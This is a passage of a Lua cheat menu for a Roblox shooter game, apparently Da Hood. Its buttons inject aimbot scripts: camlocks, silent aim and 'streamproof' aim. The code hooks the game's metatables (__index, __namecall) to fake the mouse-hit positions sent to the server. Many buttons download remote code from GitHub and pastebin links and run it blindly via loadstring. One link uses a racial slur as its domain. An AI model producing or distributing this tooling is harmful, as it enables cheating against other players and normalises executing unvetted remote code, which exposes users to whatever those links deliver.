getgenv().Prediction = 0.136	
elseif ping < 60 then	
getgenv().Prediction = 0.140	
elseif ping < 50 then	
getgenv().Prediction = 0.143	
elseif ping < 40 then	
getgenv().Prediction = 0.145	
elseif ping < 30 then	
getgenv().Prediction = 0.155	
elseif ping < 20 then	
getgenv().Prediction = 0.157	
        end	
        end	
	end 
end
})
CamSec:AddButton({
	Name = "Lytra Camlock",
	Callback = function()
	
	OrionLib:MakeNotification({
	Name = "Injected successfully!",
	Content = "Injected script.",
	Image = "rbxassetid://4483345998",
	Time = 3
})




loadstring(game:HttpGet("https://raw.githubusercontent.com/godware123/zzz/main/lytrawashere"))()
		end
		
})
CamSec:AddButton({
	Name = "Camlock #6 ( Q)",
	Callback = function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/ByteGX/Main/main/camlock-1.txt"))()
end
})

CamSec:AddButton({
	Name = "Silent camlock  (Q)",
	Callback = function()
	local hotkey = "q" -- toggle key
local mouse = game.Players.LocalPlayer:GetMouse()


mouse.KeyDown:Connect(function(key)
if key == hotkey then
if getgenv().DaHoodSettings.SilentAim == true then
 getgenv().DaHoodSettings.SilentAim = false
else
getgenv().DaHoodSettings.SilentAim = true
end
end
end)

loadstring(game:HttpGet("https://pastebin.com/raw/zVeEZTs6",true))()
DaHoodSettings.Prediction = 0.169 -- lower for lower ping and higher for higher ping.
Aiming.FOV = 9 -- size of silent aim
Aiming.FOVSides = 25 -- how smooth silent aim circle is
Aiming.HitChance = 100 
Aiming.ShowFOV = false

 getgenv().AimlockKey = "e" -- aimbot toggle
 getgenv().AimPart = "Head" -- UpperTorso, LowerTorso, HumanoidRootPart, Head
 getgenv().PredictionVelocity = 6.612 -- aimbot prediction.
 getgenv().SmoothnessAmount = 0.9 -- dont go over 0.01 to look legit
  	end   
})
















--•┃Streamable tab ┃•-- Working Completed/Still adding things

local Stream = Window:MakeTab({
	Name = "Streamproof",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
local StreamSec = Stream:AddSection({
	Name = "Streamproof aiming",
})
StreamSec:AddButton({
	Name = "GAVS ( Silent ) ",
	Callback = function()
	
	OrionLib:MakeNotification({
	Name = "Injected successfully!",
	Content = "Injected script.",
	Image = "rbxassetid://4483345998",
	Time = 3
})



OrionLib:MakeNotification({
	Name = "Note; ",
	Content = "U need a good tracing for this script.",
	Image = "rbxassetid://4483345998",
	Time = 5
})

      			if not game:IsLoaded() then
game.Loaded:Wait()
end


-- // Dependencies
_G.PRED = 0.025
local Aiming = loadstring(game:HttpGet("https://raw.githubusercontent.com/xllaoxxzx/fuckinngr/main/sas"))()
Aiming.TeamCheck(false)
Aiming.ShowFOV = false
Aiming.FOV = 22
-- // Services
local Workspace = game:GetService("Workspace")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")

-- // Vars
local LocalPlayer = Players.LocalPlayer
local Mouse = LocalPlayer:GetMouse()
local CurrentCamera = Workspace.CurrentCamera

local DaHoodSettings = {
    SilentAim = true,
    AimLock = false,
    Prediction = 0.145,
    AimLockKeybind = Enum.KeyCode.E
}
getgenv().DaHoodSettings = DaHoodSettings

-- // Overwrite to account downed
function Aiming.Check()
    -- // Check A
    if not (Aiming.Enabled == true and Aiming.Selected ~= LocalPlayer and Aiming.SelectedPart ~= nil) then
        return false
    end

    -- // Check if downed
    local Character = Aiming.Character(Aiming.Selected)
    local KOd = Character:WaitForChild("BodyEffects")["K.O"].Value
    local Grabbed = Character:FindFirstChild("GRABBING_CONSTRAINT") ~= nil

    -- // Check B
    if (KOd or Grabbed) then
        return false
    end

    -- //
    return true
end

-- // Hook
local __index
__index = hookmetamethod(game, "__index", function(t, k)
    -- // Check if it trying to get our mouse's hit or target and see if we can use it
    if (t:IsA("Mouse") and (k == "Hit" or k == "Target") and Aiming.Check()) then
        -- // Vars
        local SelectedPart = Aiming.SelectedPart

        -- // Hit/Target
        if (DaHoodSettings.SilentAim and (k == "Hit" or k == "Target")) then
            -- // Hit to account prediction
            local Hit = SelectedPart.CFrame + (SelectedPart.Velocity * DaHoodSettings.Prediction)

            -- // Return modded val
            return (k == "Hit" and Hit or SelectedPart)
        end
    end

    -- // Return
    return __index(t, k)
end)

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()

mouse.KeyDown:Connect(function(key)
    if key == "q" then
        if Aiming.Enabled == false then
        Aiming.Enabled = true
        else
        Aiming.Enabled = false
        end
    end
end)


RunService.RenderStepped:Connect(function()
    local ping = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
    local Value = tostring(ping)
    local pingValue = Value:split(" ")
    local PingNumber = pingValue[1]
    DaHoodSettings.Prediction = PingNumber / 1000 + _G.PRED
end)
  	end    
})
StreamSec:AddButton({
	Name = "6Akan streamable (Q)",
	Callback = function()

OrionLib:MakeNotification({
	Name = "Injected successfully!",
	Content = "Injected script.",
	Image = "rbxassetid://4483345998",
	Time = 3
})










local Settings = {
    rewrittenmain = {
        Enabled = true,
        Key = "q",
        DOT = false,
        AIRSHOT = true,
        NOTIF = false,
        AUTOPRED = true,
        FOV = math.huge,
        RESOVLER = true
    }
}
 
local SelectedPart = "LowerTorso"
local Prediction = true
local PredictionValue = 0.12467245219812
 
 
    local AnchorCount = 0
    local MaxAnchor = 50
 
    local CC = game:GetService"Workspace".CurrentCamera
    local Plr;
    local enabled = false
    local accomidationfactor = 0.1234772452176
    local mouse = game.Players.LocalPlayer:GetMouse()
    local placemarker = Instance.new("Part", game.Workspace)
 
    function makemarker(Parent, Adornee, Color, Size, Size2)
        local e = Instance.new("BillboardGui", Parent)
        e.Name = "PP"
        e.Adornee = Adornee
        e.Size = UDim2.new(Size, Size2, Size, Size2)
        e.AlwaysOnTop = Settings.rewrittenmain.DOT
        local a = Instance.new("Frame", e)
        if Settings.rewrittenmain.DOT == true then
        a.Size = UDim2.new(1, 0, 1, 0)
        else
        a.Size = UDim2.new(0, 0, 0, 0)
        end
        if Settings.rewrittenmain.DOT == true then
        a.Transparency = 0
        a.BackgroundTransparency = 0
        else
        a.Transparency = 1
        a.BackgroundTransparency = 1
        end
        a.BackgroundColor3 = Color
        local g = Instance.new("UICorner", a)
        if Settings.rewrittenmain.DOT == false then
        g.CornerRadius = UDim.new(0, 0)
        else
        g.CornerRadius = UDim.new(1, 1) 
        end
        return(e)
    end
 
 
    local data = game.Players:GetPlayers()
    function noob(player)
        local character
        repeat wait() until player.Character
        local handler = makemarker(guimain, player.Character:WaitForChild(SelectedPart), Color3.fromRGB(107, 184, 255), 0.3, 3)
        handler.Name = player.Name
        player.CharacterAdded:connect(function(Char) handler.Adornee = Char:WaitForChild(SelectedPart) end)
 
 
        spawn(function()
            while wait() do
                if player.Character then
                end
            end
        end)
    end
 
    for i = 1, #data do
        if data[i] ~= game.Players.LocalPlayer then
            noob(data[i])
        end
    end
 
    game.Players.PlayerAdded:connect(function(Player)
        noob(Player)
    end)
 
    spawn(function()
        placemarker.Anchored = true
        placemarker.CanCollide = false
        if Settings.rewrittenmain.DOT == true then
        placemarker.Size = Vector3.new(8, 8, 8)
        else
        placemarker.Size = Vector3.new(0, 0, 0)
        end
        placemarker.Transparency = 0.75
        if Settings.rewrittenmain.DOT then
        makemarker(placemarker, placemarker, Color3.fromRGB(232, 186, 200), 0.40, 0)
        end
    end)
 
    game.Players.LocalPlayer:GetMouse().KeyDown:Connect(function(k)
        if k == Settings.rewrittenmain.Key and Settings.rewrittenmain.Enabled then
            if enabled == true then
                enabled = false
                if Settings.rewrittenmain.NOTIF == true then
                    Plr = getClosestPlayerToCursor()
                game.StarterGui:SetCore("SendNotification", {
						Title = "6akan Locking Alert",
						Text = "Unlocked",
						Icon = "http://www.roblox.com/asset/?id=8850953349",
						Duration = 1,
})
            end
            else
                Plr = getClosestPlayerToCursor()
                enabled = true
                if Settings.rewrittenmain.NOTIF == true then
 
                    game.StarterGui:SetCore("SendNotification", {
						Title = "6akan Locking Alert",
						Text = "Locked on :"..tostring(Plr.Name);
						Icon = "http://www.roblox.com/asset/?id=8850953349",
						Duration = 1,
})
 
                end
            end
        end
    end)
 
 
 
    function getClosestPlayerToCursor()
        local closestPlayer
        local shortestDistance = Settings.rewrittenmain.FOV
 
        for i, v in pairs(game.Players:GetPlayers()) do
            if v ~= game.Players.LocalPlayer and v.Character and v.Character:FindFirstChild("Humanoid") and v.Character.Humanoid.Health ~= 0 and v.Character:FindFirstChild("HumanoidRootPart") then
                local pos = CC:WorldToViewportPoint(v.Character.PrimaryPart.Position)
                local magnitude = (Vector2.new(pos.X, pos.Y) - Vector2.new(mouse.X, mouse.Y)).magnitude
                if magnitude < shortestDistance then
                    closestPlayer = v
                    shortestDistance = magnitude
                end
            end
        end
        return closestPlayer
    end
 
    local pingvalue = nil;
    local split = nil;
    local ping = nil;
 
    game:GetService"RunService".Stepped:connect(function()
        if enabled and Plr.Character ~= nil and Plr.Character:FindFirstChild("HumanoidRootPart") then
            placemarker.CFrame = CFrame.new(Plr.Character.HumanoidRootPart.Position+(Plr.Character.HumanoidRootPart.Velocity*accomidationfactor))
        else
            placemarker.CFrame = CFrame.new(0, 9999, 0)
        end
        if Settings.rewrittenmain.AUTOPRED == true then
             pingvalue = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
             split = string.split(pingvalue,'(')
             ping = tonumber(split[1])
            if ping < 130 then
                PredictionValue = 0.151
            elseif ping < 125 then
                PredictionValue = 0.149
            elseif ping < 110 then
                PredictionValue = 0.146
            elseif ping < 105 then
                PredictionValue = 0.138
            elseif ping < 90 then
                PredictionValue = 0.136
            elseif ping < 80 then
                PredictionValue = 0.134
            elseif ping < 70 then
                PredictionValue = 0.131
            elseif ping < 60 then
                PredictionValue = 0.1229
            elseif ping < 50 then
                PredictionValue = 0.1225
            elseif ping < 40 then
                PredictionValue = 0.1256
            end
        end
    end)
 
    local mt = getrawmetatable(game)
    local old = mt.__namecall
    setreadonly(mt, false)
    mt.__namecall = newcclosure(function(...)
        local args = {...}
        if enabled and getnamecallmethod() == "FireServer" and args[2] == "UpdateMousePos" and Settings.rewrittenmain.Enabled and Plr.Character ~= nil then
 
            -- args[3] = Plr.Character.HumanoidRootPart.Position+(Plr.Character.HumanoidRootPart.Velocity*accomidationfactor)
            --[[
            if Settings.rewrittenmain.AIRSHOT == true then
                if game.Workspace.Players[Plr.Name].Humanoid:GetState() == Enum.HumanoidStateType.Freefall then -- Plr.Character:WaitForChild("Humanoid"):GetState() == Enum.HumanoidStateType.Freefall
 
                    --// Airshot
                    args[3] = Plr.Character.LeftFoot.Position+(Plr.Character.LeftFoot.Velocity*PredictionValue)
 
                else
                    args[3] = Plr.Character.HumanoidRootPart.Position+(Plr.Character.HumanoidRootPart.Velocity*PredictionValue)
 
                end
            else
                    args[3] = Plr.Character.HumanoidRootPart.Position+(Plr.Character.HumanoidRootPart.Velocity*PredictionValue)
            end
            ]]
            if Prediction == true then
 
            args[3] = Plr.Character[SelectedPart].Position+(Plr.Character[SelectedPart].Velocity*PredictionValue)
 
            else
 
            args[3] = Plr.Character[SelectedPart].Position
 
            end
 
            return old(unpack(args))
        end
        return old(...)
    end)
 
    game:GetService("RunService").RenderStepped:Connect(function()
        if Settings.rewrittenmain.RESOVLER == true and Plr.Character ~= nil and enabled and Settings.rewrittenmain.Enabled then
        if Settings.rewrittenmain.AIRSHOT == true and enabled and Plr.Character ~= nil then
 
            if game.Workspace.Players[Plr.Name].Humanoid:GetState() == Enum.HumanoidStateType.Freefall then -- Plr.Character:WaitForChild("Humanoid"):GetState() == Enum.HumanoidStateType.Freefall
 
                --// Airshot
 
                --// Anchor Check
 
                if Plr.Character ~= nil and Plr.Character.HumanoidRootPart.Anchored == true then
                    AnchorCount = AnchorCount + 1
                    if AnchorCount >= MaxAnchor then
                        Prediction = false
                        wait(2)
                        AnchorCount = 0;
                    end
                else
                    Prediction = true
                    AnchorCount = 0;
                end
 
                SelectedPart = "LeftFoot"
 
            else
                --// Anchor Check
 
                if Plr.Character ~= nil and Plr.Character.HumanoidRootPart.Anchored == true then
                    AnchorCount = AnchorCount + 1
                    if AnchorCount >= MaxAnchor then
                        Prediction = false
                        wait(2)
                        AnchorCount = 0;
                    end
                else
                    Prediction = true
                    AnchorCount = 0;
                end
 
                SelectedPart = "HumanoidRootPart"
 
            end
            else
 
                --// Anchor Check
 
                if Plr.Character ~= nil and Plr.Character.HumanoidRootPart.Anchored == true then
                    AnchorCount = AnchorCount + 1
                    if AnchorCount >= MaxAnchor then
                        Prediction = false
                        wait(2)
                        AnchorCount = 0;
                    end
                else
                    Prediction = true
                    AnchorCount = 0;
                end
 
                SelectedPart = "HumanoidRootPart"
            end
 
        else
                SelectedPart = "HumanoidRootPart"
        end
    end)

	end
})
StreamSec:AddButton({
	Name = "Streamable #3 No toggle",
	Callback = function()
	loadstring(game:HttpGet("https://pastebin.com/raw/SbtCNZg7"))()
DaHoodSettings.Prediction = 0.1437
Aiming.TargetPart = {"Head", "UpperTorso", "LowerTorso", "HumanoidRootPart", "RightFoot", "LeftFoot"}
Aiming.FOV = 9.4
Aiming.FOVSides = 25
Aiming.HitChance = 110
Aiming.ShowFOV = false
			end
})
StreamSec:AddButton({
	Name = "Streamable #4 No toggle",
	Callback = function()
	-- 0.138
-- 0.11243
loadstring(game:HttpGet("https://raw.githubusercontent.com/topillesrevenge/Streamable-Silent/main/Main"))()
DaHoodSettings.Prediction = 0.121
Aiming.TargetPart = {"Head", "LeftHand", "RightHand", "LeftLowerArm", "RightLowerArm", "LeftUpperArm", "RightUpperArm", "LeftFoot", "LeftLowerLeg", "UpperTorso", "HumanoidRootPart", "LeftUpperLeg", "RightLowerLeg", "RightFoot", "LowerTorso"}
Aiming.FOV = 25
Aiming.FOVSides = 25
Aiming.HitChance = 400
Aiming.ShowFOV = false
  	end  
})
StreamSec:AddButton({
	Name = "Streamable #5 (E)",
	Callback = function()
	loadstring(game:HttpGet("https://pastebin.com/raw/KRuJGdCx",true))()
			end
})
StreamSec:AddButton({
	Name = "Streamable #6 (Z)",
	Callback = function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/stabrn/-3/main/source", true))()
    getgenv().Aiming.FOV = 14
    getgenv().Aiming.FOVSides = 360
    getgenv().Aiming.HitChance = 100
    getgenv().Aiming.ShowFOV = true
    getgenv().DahoodSettings.Prediction = 0.124
    getgenv().cframeSpheedhotkeyXd1 = "z" --toggle

    getgenv().Aiming.UseMoreHitparts = true
    getgenv().Aiming.UseNearestCursor = true
    getgenv().Aiming.AutoPrediction = true
    getgenv().Aiming.KnockedCheck = true
    getgenv().Aiming.GrabbedCheck = true
    getgenv().Aiming.Wallcheck = true
  	end    
})
StreamSec:AddButton({
	Name = "Streamable #7 No toggle",
	Callback = function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/T0xicJacob/eatensdad/main/eaten-streamable", true))()
		end
})
StreamSec:AddButton({
	Name = "Streamable #8 No toggle",
	Callback = function()
	loadstring(game:HttpGet("https://pastebin.com/raw/irzRBBH0", true))()
	end
})
StreamSec:AddButton({
	Name = "Streamable #9 No toggle",
	Callback = function()
	
	
	
	
	getgenv().DNS = {
    Silent = {
        Enabled = true,
        Part = "HumanoidRootPart",
        Pred = 0.119,
        CloseestPart = true,
},
    FOV = {
        Visible = true,
        Radius = 25,
},
    GunFOV = {
        Enabled = false,
        DoubleBarrel = 10,
        Revolver = 15,
        Rifle = 20,
        Shotgun = 20,
        Smg = 23,
        TacticalShotgun = 24,
        Silencer = 17,
        AK47 = 8,
        AR = 15,
},
    Tracer = {
        Key = "C",
        Enabled = true,
        Pred = 0.135,
        Part = "HumanoidRootPart",
        Smoothness = 0.014
},
    Misc = {
        Resolver = true,
        AutoPrediction = true,
        Shake = true,
        ShakeValue = 65,
        UnlockedOnDeath = true
    },
}
loadstring(game:HttpGet("https://nigga.digital/dns.lua"))()
  	end    
})
StreamSec:AddButton({
	Name = "Streamable #10 No toggle",
	Callback = function()
	-- LEAKED 
-- LEAKED LEAKED 
-- 0.138
-- 0.11243
loadstring(game:HttpGet("https://raw.githubusercontent.com/topillesrevenge/Streamable-Silent/main/Main"))()
DaHoodSettings.Prediction = 0.121
Aiming.TargetPart = {"Head", "LeftHand", "RightHand", "LeftLowerArm", "RightLowerArm", "LeftUpperArm", "RightUpperArm", "LeftFoot", "LeftLowerLeg", "UpperTorso", "HumanoidRootPart", "LeftUpperLeg", "RightLowerLeg", "RightFoot", "LowerTorso"}
Aiming.FOV = 7
Aiming.FOVSides = 25
Aiming.HitChance = 350
Aiming.ShowFOV = true

  	end    
})


























StreamSec:AddLabel("Ill add more later")




local Silent = Window:MakeTab({
	Name = "Silent aim ",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
local SilentSec = Silent:AddSection({
	Name = "Silent aiming"
})
SilentSec:AddButton({
	Name = "Ordium silent aim.",
	Callback = function()

OrionLib:MakeNotification({
	Name = "Injected successfully!",
	Content = "Injected script.",
	Image = "rbxassetid://4483345998",
	Time = 3
})









OrionLib:MakeNotification({
	Name = "Warning!",
	Content = "This silent aim has built in tracer! to activate it press Q",
	Image = "rbxassetid://4483345998",
	Time = 15
})











	getgenv().Ordium = {
    SilentAim = {
        Key = "C",
        Enabled = true,
        Prediction = 0.119,
        AimingType = "Closest Part", -- Closest Part, Default
        AimPart = "HumanoidRootPart",
        
        ChanceData = {UseChance = false, Chance = 100},
        FOVData = {Radius = 80, Visibility = true, Filled = false},

        AimingData = {CheckKnocked = true, CheckGrabbed = true,
        CheckWalls = true},

    },
    Tracing = {
        Key = 'Q',
        Enabled = true,
        Prediction = 8,
        AimPart = "HumanoidRootPart",
        TracingOptions = {Strength = "Soft", AimingType = "Closest Part",  Smoothness = 0.11} 
                            -- Hard, Soft
    }
}

local Ordium = {functions = {}}

local Vector2New, Cam, Mouse, client, find, Draw, Inset, players, RunService, UIS=
    Vector2.new,
    workspace.CurrentCamera,
    game.Players.LocalPlayer:GetMouse(),
    game.Players.LocalPlayer,
    table.find,
    Drawing.new,
    game:GetService("GuiService"):GetGuiInset().Y,
    game.Players, 
    game.RunService,
    game:GetService("UserInputService")


local mf, rnew = math.floor, Random.new

local Targetting
local lockedCamTo

local Circle = Draw("Circle")
Circle.Thickness = 1
Circle.Transparency = 0.7
Circle.Color = Color3.new(1,1,1)

Ordium.functions.update_FOVs = function ()
    if not (Circle) then
        return Circle
    end
    Circle.Radius =  getgenv().Ordium.SilentAim.FOVData.Radius * 3
    Circle.Visible = getgenv().Ordium.SilentAim.FOVData.Visibility
    Circle.Filled = getgenv().Ordium.SilentAim.FOVData.Filled
    Circle.Position = Vector2New(Mouse.X, Mouse.Y + (Inset))
    return Circle
end

Ordium.functions.onKeyPress = function(inputObject)
    if inputObject.KeyCode == Enum.KeyCode[getgenv().Ordium.SilentAim.Key:upper()] then
        getgenv().Ordium.SilentAim.Enabled = not getgenv().Ordium.SilentAim.Enabled
    end

    if inputObject.KeyCode == Enum.KeyCode[getgenv().Ordium.Tracing.Key:upper()] then
        getgenv().Ordium.Tracing.Enabled = not getgenv().Ordium.Tracing.Enabled
        if getgenv().Ordium.Tracing.Enabled then
            lockedCamTo = Ordium.functions.returnClosestPlayer(getgenv().Ordium.SilentAim.ChanceData.Chance)
        end
    end
end

UIS.InputBegan:Connect(Ordium.functions.onKeyPress)


Ordium.functions.wallCheck = function(direction, ignoreList)
    if not getgenv().Ordium.SilentAim.AimingData.CheckWalls then
        return true
    end

    local ray = Ray.new(Cam.CFrame.p, direction - Cam.CFrame.p)
    local part, _, _ = game:GetService("Workspace"):FindPartOnRayWithIgnoreList(ray, ignoreList)

    return not part
end

Ordium.functions.pointDistance = function(part)
    local OnScreen = Cam.WorldToScreenPoint(Cam, part.Position)
    if OnScreen then
        return (Vector2New(OnScreen.X, OnScreen.Y) - Vector2New(Mouse.X, Mouse.Y)).Magnitude
    end
end

Ordium.functions.returnClosestPart = function(Character)
    local data = {
        dist = math.huge,
        part = nil,
        filteredparts = {},
        classes = {"Part", "BasePart", "MeshPart"}
    }

    if not (Character and Character:IsA("Model")) then
        return data.part
    end
    local children = Character:GetChildren()
    for _, child in pairs(children) do
        if table.find(data.classes, child.ClassName) then
            table.insert(data.filteredparts, child)
            for _, part in pairs(data.filteredparts) do
                local dist = Ordium.functions.pointDistance(part)
                if Circle.Radius > dist and dist < data.dist then
                    data.part = part
                    data.dist = dist
                end
            end
        end
    end
    return data.part
end

Ordium.functions.returnClosestPlayer = function (amount)
    local data = {
        dist = 1/0,
        player = nil
    }

    amount = amount or nil

    for _, player in pairs(players:GetPlayers()) do
        if (player.Character and player ~= client) then
            local dist = Ordium.functions.pointDistance(player.Character.HumanoidRootPart)
            if Circle.Radius > dist and dist < data.dist and 
            Ordium.functions.wallCheck(player.Character.Head.Position,{client, player.Character}) then
                data.dist = dist
                data.player = player
            end
        end
    end
    local calc = mf(rnew().NextNumber(rnew(), 0, 1) * 100) / 100
    local use = getgenv().Ordium.SilentAim.ChanceData.UseChance
    if use and calc <= mf(amount) / 100 then
        return calc and data.player
    else
        return data.player
    end
end

Ordium.functions.setAimingType = function (player, type)
    local previousSilentAimPart = getgenv().Ordium.SilentAim.AimPart
    local previousTracingPart = getgenv().Ordium.Tracing.AimPart
    if type == "Closest Part" then
        getgenv().Ordium.SilentAim.AimPart = tostring(Ordium.functions.returnClosestPart(player.Character))
        getgenv().Ordium.Tracing.AimPart = tostring(Ordium.functions.returnClosestPart(player.Character))
    elseif type == "Closest Point" then
        Ordium.functions.returnClosestPoint()
    elseif type == "Default" then
        getgenv().Ordium.SilentAim.AimPart = previousSilentAimPart
        getgenv().Ordium.Tracing.AimPart = previousTracingPart
    else
        getgenv().Ordium.SilentAim.AimPart = previousSilentAimPart
        getgenv().Ordium.Tracing.AimPart = previousTracingPart
    end
end

Ordium.functions.aimingCheck = function (player)
    if getgenv().Ordium.SilentAim.AimingData.CheckKnocked == true and player and player.Character then
        if player.Character.BodyEffects["K.O"].Value then
            return true
        end
    end
    if getgenv().Ordium.SilentAim.AimingData.CheckGrabbed == true and player and player.Character then
        if player.Character:FindFirstChild("GRABBING_CONSTRAINT") then
            return true
        end
    end
    return false
end


local lastRender = 0
local interpolation = 0.01

RunService.RenderStepped:Connect(function(delta)
    local valueTypes = 1.375
    lastRender = lastRender + delta
    while lastRender > interpolation do
        lastRender = lastRender - interpolation
    end
    if getgenv().Ordium.Tracing.Enabled and lockedCamTo ~= nil and getgenv().Ordium.Tracing.TracingOptions.Strength == "Hard" then
        local Vel =  lockedCamTo.Character[getgenv().Ordium.Tracing.AimPart].Velocity / (getgenv().Ordium.Tracing.Prediction * valueTypes)
        local Main = CFrame.new(Cam.CFrame.p, lockedCamTo.Character[getgenv().Ordium.Tracing.AimPart].Position + (Vel))
        Cam.CFrame = Cam.CFrame:Lerp(Main ,getgenv().Ordium.Tracing.TracingOptions.Smoothness , Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
        Ordium.functions.setAimingType(lockedCamTo, getgenv().Ordium.Tracing.TracingOptions.AimingType)
    elseif getgenv().Ordium.Tracing.Enabled and lockedCamTo ~= nil and getgenv().Ordium.Tracing.TracingOptions.Strength == "Soft" then
        local Vel =  lockedCamTo.Character[getgenv().Ordium.Tracing.AimPart].Velocity / (getgenv().Ordium.Tracing.Prediction / valueTypes)
        local Main = CFrame.new(Cam.CFrame.p, lockedCamTo.Character[getgenv().Ordium.Tracing.AimPart].Position + (Vel))
        Cam.CFrame = Cam.CFrame:Lerp(Main ,getgenv().Ordium.Tracing.TracingOptions.Smoothness , Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
        Ordium.functions.setAimingType(lockedCamTo, getgenv().Ordium.Tracing.TracingOptions.AimingType)
    else

    end
end)

task.spawn(function ()
    while task.wait() do
        if Targetting then
            Ordium.functions.setAimingType(Targetting, getgenv().Ordium.SilentAim.AimingType)
        end
        Ordium.functions.update_FOVs()
    end
end)


local __index
__index = hookmetamethod(game,"__index", function(Obj, Property)
    if Obj:IsA("Mouse") and Property == "Hit" then
        Targetting = Ordium.functions.returnClosestPlayer(getgenv().Ordium.SilentAim.ChanceData.Chance)
        if Targetting ~= nil and getgenv().Ordium.SilentAim.Enabled and not Ordium.functions.aimingCheck(Targetting) then
            local currentvelocity = Targetting.Character[getgenv().Ordium.SilentAim.AimPart].Velocity
            local currentposition = Targetting.Character[getgenv().Ordium.SilentAim.AimPart].CFrame

            return currentposition + (currentvelocity * getgenv().Ordium.SilentAim.Prediction)
        end
    end
    return __index(Obj, Property)
end)
  	end    
})
SilentSec:AddLabel("I DONT KNOW if any of these silent works underneath.")
SilentSec:AddLabel("Will be updated as the script grows.")
SilentSec:AddButton({
	Name = "Silent #1",
	Callback = function()

OrionLib:MakeNotification({
	Name = "Injected successfully!",
	Content = "Injected script.",
	Image = "rbxassetid://4483345998",
	Time = 3
})






	local hotkey = "n" -- toggle key
local mouse = game.Players.LocalPlayer:GetMouse()



mouse.KeyDown:Connect(function(key)
if key == hotkey then
if getgenv().ValiantAimHacks.SilentAimEnabled == true then
 getgenv().ValiantAimHacks.SilentAimEnabled = false
else
getgenv().ValiantAimHacks.SilentAimEnabled = true
end
end
end)


-- // Services
local Players = game:GetService("Players")

-- // Vars
local LocalPlayer = Players.LocalPlayer
local accomidationfactor = 0.1

-- // Silent Aim Module
local SilentAim = loadstring(game:HttpGet("https://pastebin.com/raw/2f0mGbMP"))()
SilentAim.TeamCheck = false
-- // Metatable vars
local mt = getrawmetatable(game)
local backupindex = mt.__index
setreadonly(mt, false)

-- // Check if player is down
SilentAim.checkSilentAim = function()
    local checkA = (SilentAim.SilentAimEnabled == true and SilentAim.Selected ~= LocalPlayer)
    local playerCharacter = SilentAim.Selected.Character
    local daHood = (playerCharacter.BodyEffects["K.O"].Value == false or playerCharacter:FindFirstChild("GRABBING_CONSTRAINT") ~= nil)

    return (checkA and daHood)
end

-- // Hook
mt.__index = newcclosure(function(t, k)
    if (t:IsA("Mouse") and (k == "Hit")) then
        
        local CPlayer = SilentAim.Selected
        if (SilentAim.checkSilentAim()) then
            if (CPlayer.Character:FindFirstChild("HumanoidRootPart")) then
                return {p=(CPlayer.Character.HumanoidRootPart.CFrame.p+(CPlayer.Character.HumanoidRootPart.Velocity*accomidationfactor))}
            end
        end
    end
    return backupindex(t, k)
end)

-- // Revert
setreadonly(mt, true)
getgenv().ValiantAimHacks.FOV = 16.5
end
})
CamSec:AddButton({
	Name = "Haunts camlock (q,)",
	Callback = function()

OrionLib:MakeNotification({
	Name = "Injected successfully!",
	Content = "Injected script.",
	Image = "rbxassetid://4483345998",
	Time = 3
})



	getgenv().Prediction = 0.15038
getgenv().AimPart = "HumanoidRootPart"
getgenv().Key = "Q"
getgenv().DisableKey = "P"

getgenv().FOV = true
getgenv().ShowFOV = false
getgenv().FOVSize = 55

--// Variables (Service)

local Players = game:GetService("Players")
local RS = game:GetService("RunService")
local WS = game:GetService("Workspace")
local GS = game:GetService("GuiService")
local SG = game:GetService("StarterGui")

--// Variables (regular)

local LP = Players.LocalPlayer
local Mouse = LP:GetMouse()
local Camera = WS.CurrentCamera
local GetGuiInset = GS.GetGuiInset

local AimlockState = true
local Locked
local Victim

local SelectedKey = getgenv().Key
local SelectedDisableKey = getgenv().DisableKey

--// Notification function

function Notify(tx)
    SG:SetCore("SendNotification", {
        Title = "Cam Lock Enabled | .gg/streamproof",
        Text = tx,
        Duration = 5
    })
end

--// Check if aimlock is loaded

if getgenv().Loaded == true then
    Notify("Aimlock is already loaded!")
    return
end

getgenv().Loaded = true

--// FOV Circle

local fov = Drawing.new("Circle")
fov.Filled = false
fov.Transparency = 1
fov.Thickness = 1
fov.Color = Color3.fromRGB(255, 255, 0)
fov.NumSides = 1000

--// Functions

function update()
    if getgenv().FOV == true then
        if fov then
            fov.Radius = getgenv().FOVSize * 2
            fov.Visible = getgenv().ShowFOV
            fov.Position = Vector2.new(Mouse.X, Mouse.Y + GetGuiInset(GS).Y)

            return fov
        end
    end
end

function WTVP(arg)
    return Camera:WorldToViewportPoint(arg)
end

function WTSP(arg)
    return Camera.WorldToScreenPoint(Camera, arg)
end

function getClosest()
    local closestPlayer
    local shortestDistance = math.huge

    for i, v in pairs(game.Players:GetPlayers()) do
        local notKO = v.Character:WaitForChild("BodyEffects")["K.O"].Value ~= true
        local notGrabbed = v.Character:FindFirstChild("GRABBING_COINSTRAINT") == nil
        
        if v ~= game.Players.LocalPlayer and v.Character and v.Character:FindFirstChild("Humanoid") and v.Character.Humanoid.Health ~= 0 and v.Character:FindFirstChild(getgenv().AimPart) and notKO and notGrabbed then
            local pos = Camera:WorldToViewportPoint(v.Character.PrimaryPart.Position)
            local magnitude = (Vector2.new(pos.X, pos.Y) - Vector2.new(Mouse.X, Mouse.Y)).magnitude
            
            if (getgenv().FOV) then
                if (fov.Radius > magnitude and magnitude < shortestDistance) then
                    closestPlayer = v
                    shortestDistance = magnitude
                end
            else
                if (magnitude < shortestDistance) then
                    closestPlayer = v
                    shortestDistance = magnitude
                end
            end
        end
    end
    return closestPlayer
end
 
--// Checks if key is down

Mouse.KeyDown:Connect(function(k)
    SelectedKey = SelectedKey:lower()
    SelectedDisableKey = SelectedDisableKey:lower()
    if k == SelectedKey then
        if AimlockState == true then
            Locked = not Locked
            if Locked then
                Victim = getClosest()

                Notify("Locked onto: "..tostring(Victim.Character.Humanoid.DisplayName))
            else
                if Victim ~= nil then
                    Victim = nil

                    Notify("Unlocked!")
                end
            end
        else
            Notify("Aimlock is not enabled!")
        end
    end
    if k == SelectedDisableKey then
        AimlockState = not AimlockState
    end
end)

--// Loop update FOV and loop camera lock onto target

RS.RenderStepped:Connect(function()
    update()
    if AimlockState == true then
        if Victim ~= nil then
